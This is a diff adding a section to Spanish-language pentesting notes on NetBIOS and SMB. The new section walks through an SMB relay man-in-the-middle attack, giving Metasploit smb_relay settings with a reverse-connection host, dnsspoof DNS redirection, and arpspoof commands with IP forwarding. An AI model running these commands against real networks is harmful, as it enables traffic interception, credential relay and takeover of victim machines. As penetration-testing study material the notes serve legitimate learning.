@@ -81,3 +81,47 @@ En el contexto de **pentesting**, NetBIOS es relevante porque los servicios mal 
 - **Explotación**: Acceso anónimo, fuerza bruta de credenciales o explotación de vulnerabilidades en versiones antiguas como SMBv1.
 - **Post-explotación**: Usar credenciales para ganar control total con herramientas como `psexec.py`.
 
+---
+
+## 🕵️‍♂️ Man-in-the-Middle (MITM) en SMB
+
+### 🔥 Explotación con Metasploit
+
+Utilizaremos el módulo **exploit/windows/smb/smb_relay** de **Metasploit**, que permite realizar ataques de relé SMB.
+
+1️⃣ **Configurar el módulo en Metasploit**  
+   - **SRVHOST** → Dirección IP del atacante (server).  
+   - **LHOST** → IP del atacante para recibir conexiones inversas.  
+   - **SMBHOST** → IP de la víctima (objetivo del ataque).  
+   
+```bash
+use exploit/windows/smb/smb_relay
+set SRVHOST ip_server
+set LHOST ip_server
+set SMBHOST ip_victim
+run
+```
+
+### 📡 Configuración del spoofing DNS
+
+Guardamos la IP del servidor atacante y el dominio DNS al que se dirigirá la víctima en un archivo de texto:
+
+```bash
+echo "ip_server *.dns" > dns.txt
+```
+
+Ahora usamos **dnspoof** para interceptar las consultas DNS y redirigirlas:
+
+```bash
+dnsspoof -i eth1 -f dns.txt
+```
+
+El siguiente paso es redirigir el tráfico de la víctima hacia el atacante mediante **ARP Spoofing**:
+
+```bash
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+arpspoof -i eth1 -t ip_victim gateway
+#new tan
+arpspoof -i eth1 -t gateway ip_victim
+```
